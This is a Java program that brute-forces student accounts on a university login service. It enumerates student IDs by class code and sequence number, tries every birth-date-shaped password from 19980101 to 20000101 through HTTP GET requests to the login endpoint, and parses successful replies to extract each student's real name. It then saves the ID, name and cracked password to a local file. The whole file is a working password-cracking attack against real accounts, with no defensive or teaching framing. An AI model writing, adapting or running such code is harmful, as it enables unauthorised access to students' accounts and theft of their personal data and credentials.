import com.sun.jna.platform.win32.OaIdl;
import org.apache.http.HttpEntity;
import org.apache.http.client.methods.CloseableHttpResponse;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.impl.client.HttpClients;
import org.apache.http.util.EntityUtils;

import java.io.*;
import java.util.ArrayList;
import java.util.List;
import java.util.Scanner;

/**
 * @author Chenchangsheng
 *
 *
 */
public class Main {
    private static final int STUDENTNUM=46;

    public static void main(String [] args){


        CloseableHttpClient httpclient = HttpClients.createDefault();
        String user="";
        List<String> list=initString();

        for (int i=0;i<55;i++){


            for(int j=1;j<=STUDENTNUM;j++){

                // 对学号进行处理
                String id="";

                if (j<10){
                    id=list.get(i)+"0"+String.valueOf(j);
                }else{
                    id=list.get(i)+String.valueOf(j);
                }
                System.out.println("破解"+id+"密码");
                checkPass(id);
            }




        }
        // 设定每个班级人数为46




    }
    /**
     *  得到17级所有班级代码
     */
    public static List<String> initString(){
        String str="1650422"; //pass4
        List<String> list=new ArrayList<>();
        String [] strings=str.split(" ");
        for (String s:strings) {
            if (!s.equals("")){
                list.add(s);
            }

        }
        return list;

    }
    public static void checkPass(String user){
        try( CloseableHttpClient httpclient = HttpClients.createDefault()) {
            for (int i=19980101;i<=20000101;i++) {
                if (i % 100 > 31 || i % 10000 > 1231) {
                    continue;
                }
                //?({"Result":true,"Message":"陈涛同学","JumpUrl":""})

                HttpGet httpget = new HttpGet("http://jwauth.cidp.edu.cn/Login.ashx?name=" + user + "&pwd=" + i + "&action=loginJsonP&jsonCallback=?");
                CloseableHttpResponse response = httpclient.execute(httpget);


                HttpEntity entity = response.getEntity();
                if (entity != null) {
                    HttpEntity resEntity = response.getEntity();
                    String message = EntityUtils.toString(resEntity, "utf-8");
                    if (message.contains("同学")){
                        System.out.println("成功找到密码！密码是："+i);
                        String reg = "[^\u4e00-\u9fa5]";
                        message = message.replaceAll(reg, "");

                        writeToFile("    user:"+user+"          姓名："+message+"       password:"+i);
                        break;
                    }else if (message.contains("用户名不存在")){
                        System.out.println("不存在");
                        break;
                    }
                }
            }

        } catch (IOException ee){
            ee.printStackTrace();
        }
        finally {

        }



    }
    public static void writeToFile(String info){
        FileWriter fw = null;
        try {
          //如果文件存在，则追加内容；如果文件不存在，则创建文件
            File f=new File("/Users/erdong/Downloads/pass4.txt");
            fw = new FileWriter(f, true);
        } catch (IOException e) {
            e.printStackTrace();
        }
        PrintWriter pw = new PrintWriter(fw);
        pw.println(info);
        pw.flush();
        try {
            fw.flush();
            pw.close();
            fw.close();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }


}






